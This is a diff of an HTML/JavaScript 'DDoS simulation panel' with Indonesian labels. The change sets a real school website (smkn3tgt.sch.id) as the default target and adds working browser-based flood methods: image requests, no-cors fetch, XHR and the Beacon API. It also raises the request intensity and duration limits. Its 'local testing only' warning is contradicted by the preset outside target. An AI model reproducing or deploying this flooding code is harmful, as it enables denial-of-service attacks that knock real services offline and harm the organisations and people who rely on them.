@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORE77 - DDoS SIMULATION PANEL</title>
+    <title>CORE77 - DDoS SIMULATION PANEL (FIXED)</title>
     <style>
         body {
             background-color: #111;
@@ -10,7 +10,7 @@
             padding: 20px;
         }
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: auto;
             border: 2px solid #0f0;
             padding: 20px;
@@ -53,39 +53,56 @@
             white-space: pre-wrap;
             font-size: 12px;
         }
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            background: #222;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛠️ CORE77 - DDoS SIMULATION PANEL</h1>
+        <h1>🛠️ CORE77 - DDoS SIMULATION PANEL (FIXED VERSION)</h1>
         <p><strong>⚠️ HANYA UNTUK TESTING LOKAL / SERVER SENDIRI ⚠️</strong></p>
         
         <label>🔗 Target URL (contoh: http://target.com):</label>
-        <input type="text" id="url" placeholder="http://localhost/test">
+        <input type="text" id="url" value="https://www.smkn3tgt.sch.id">
         
         <label>⚔️ Metode Serangan:</label>
         <select id="method">
-            <option value="http">HTTP Flood (GET Request)</option>
-            <option value="post">HTTP Post Flood</option>
-            <option value="slow">Slowloris Simulation</option>
+            <option value="img">Image Flood (bypass CORS)</option>
+            <option value="fetch">Fetch Flood (no-cors)</option>
+            <option value="xhr">XHR Flood (multiple)</option>
+            <option value="beacon">Beacon API Flood</option>
         </select>
         
         <label>⏱️ Durasi (detik):</label>
-        <input type="number" id="seconds" value="10" min="1" max="60">
+        <input type="number" id="seconds" value="10" min="1" max="300">
         
-        <label>🧵 Thread/Jumlah Request per Detik:</label>
-        <input type="number" id="threads" value="50" min="1" max="500">
+        <label>🧵 Intensity (request per detik per method):</label>
+        <input type="number" id="intensity" value="100" min="1" max="1000">
         
-        <button id="startBtn" onclick="startAttack()">🚀 START DDoS SIMULATION</button>
-        <button id="stopBtn" onclick="stopAttack()" disabled>⛔ STOP ATTACK</button>
+        <div class="status">
+            <strong>📊 Status:</strong>
+            <div id="status">Ready</div>
+            <div>Requests Sent: <span id="counter">0</span></div>
+            <div>Active Threads: <span id="threadCounter">0</span></div>
+        </div>
+        
+        <button id="startBtn" onclick="startAttack()">🚀 LAUNCH DDoS SIMULATION</button>
+        <button id="stopBtn" onclick="stopAttack()" disabled>⛔ EMERGENCY STOP</button>
         
         <h3>📜 Attack Log:</h3>
-        <div class="log" id="log">[System] Ready. Masukkan target dan mulai simulasi.</div>
+        <div class="log" id="log">[System] Panel siap. Target sudah di-set default ke smkn3tgt.sch.id</div>
     </div>
 
     <script>
         let attackActive = false;
+        let requestCounter = 0;
+        let activeThreads = 0;
         let controllers = [];
+        let attackIntervals = [];
         
         function log(msg) {
             const logDiv = document.getElementById('log');
@@ -93,29 +110,63 @@
             logDiv.scrollTop = logDiv.scrollHeight;
         }
         
-        async function floodRequest(url, method) {
+        function updateStatus() {
+            document.getElementById('counter').innerText = requestCounter;
+            document.getElementById('threadCounter').innerText = activeThreads;
+            document.getElementById('status').innerText = attackActive ? 'ATTACKING' : 'READY';
+            document.getElementById('status').style.color = attackActive ? '#ff0000' : '#0f0';
+        }
+        
+        // Method 1: Image based flood (bypass CORS)
+        function imageFlood(url) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                img.onload = img.onerror = () => {
+                    requestCounter++;
+                    resolve();
+                };
+                img.src = url + '?rnd=' + Math.random() + '&cid=' + requestCounter;
+                setTimeout(resolve, 50);
+            });
+        }
+        
+        // Method 2: Fetch with no-cors
+        async function fetchFlood(url) {
             try {
                 const controller = new AbortController();
                 controllers.push(controller);
-                
-                const options = {
-                    method: method === 'post' ? 'POST' : 'GET',
+                await fetch(url + '?rnd=' + Math.random(), {
                     mode: 'no-cors',
                     signal: controller.signal
+                });
+            } catch (e) {}
+            requestCounter++;
+        }
+        
+        // Method 3: XHR flood
+        function xhrFlood(url) {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', url + '?rnd=' + Math.random());
+                xhr.onload = xhr.onerror = () => {
+                    requestCounter++;
+                    resolve();
                 };
-                
-                await fetch(url, options);
-                log(`✅ Request sent to ${url}`);
-            } catch (err) {
-                log(`❌ Request failed: ${err.message}`);
-            }
+                xhr.send();
+            });
+        }
+        
+        // Method 4: Beacon API
+        function beaconFlood(url) {
+            navigator.sendBeacon(url + '?rnd=' + Math.random());
+            requestCounter++;
         }
         
         function startAttack() {
             const url = document.getElementById('url').value;
             const method = document.getElementById('method').value;
             const seconds = parseInt(document.getElementById('seconds').value);
-            const threads = parseInt(document.getElementById('threads').value);
+            const intensity = parseInt(document.getElementById('intensity').value);
             
             if (!url) {
                 alert('Masukkan URL target!');
@@ -123,44 +174,85 @@
             }
             
             attackActive = true;
+            requestCounter = 0;
+            activeThreads = intensity * 4; // Estimasi
             document.getElementById('startBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
             controllers = [];
+            attackIntervals = [];
             
-            log(`🔥 ATTACK STARTED to ${url} | Method: ${method} | Duration: ${seconds}s | Threads: ${threads}`);
+            log(`🔥 ATTACK LAUNCHED: ${url}`);
+            log(`Method: ${method} | Duration: ${seconds}s | Intensity: ${intensity}`);
             
-            // Multi-thread simulation
-            for (let i = 0; i < threads; i++) {
+            // Multi-method flood
+            const methods = {
+                'img': imageFlood,
+                'fetch': fetchFlood,
+                'xhr': xhrFlood,
+                'beacon': beaconFlood
+            };
+            
+            const selectedMethod = methods[method];
+            
+            // Launch multiple concurrent attack threads
+            for (let i = 0; i < intensity; i++) {
                 const intervalId = setInterval(() => {
                     if (!attackActive) {
                         clearInterval(intervalId);
                         return;
                     }
-                    floodRequest(url, method);
-                }, 100);
+                    selectedMethod(url);
+                }, 10); // 10ms interval = ~100 request per detik per thread
                 
-                // Auto stop setelah waktu tertentu
-                setTimeout(() => {
-                    clearInterval(intervalId);
-                }, seconds * 1000);
+                attackIntervals.push(intervalId);
             }
             
-            // Auto stop
+            // Additional parallel attack with different methods
+            if (method === 'fetch') {
+                for (let i = 0; i < intensity / 2; i++) {
+                    const intervalId = setInterval(() => {
+                        if (!attackActive) return;
+                        imageFlood(url);
+                    }, 15);
+                    attackIntervals.push(intervalId);
+                }
+            }
+            
+            updateStatus();
+            
+            // Auto stop setelah waktu tertentu
             setTimeout(() => {
                 if (attackActive) {
                     stopAttack();
                     log(`⏱️ Attack finished after ${seconds} seconds.`);
+                    log(`📈 Total requests sent: ${requestCounter}`);
                 }
             }, seconds * 1000);
         }
         
         function stopAttack() {
             attackActive = false;
+            activeThreads = 0;
+            
+            // Stop semua intervals
+            attackIntervals.forEach(interval => clearInterval(interval));
+            attackIntervals = [];
+            
+            // Abort semua fetch controllers
             controllers.forEach(controller => controller.abort());
+            controllers = [];
+            
             document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
-            log('🛑 ATTACK STOPPED manually.');
+            log('🛑 ATTACK STOPPED.');
+            updateStatus();
         }
+        
+        // Auto-update counter setiap detik
+        setInterval(updateStatus, 1000);
+        
+        log('[System] Panel fixed version loaded. Image flood method bisa bypass CORS.');
+        log('[Tip] Gunakan "Image Flood" untuk success rate lebih tinggi.');
     </script>
 </body>
 </html>
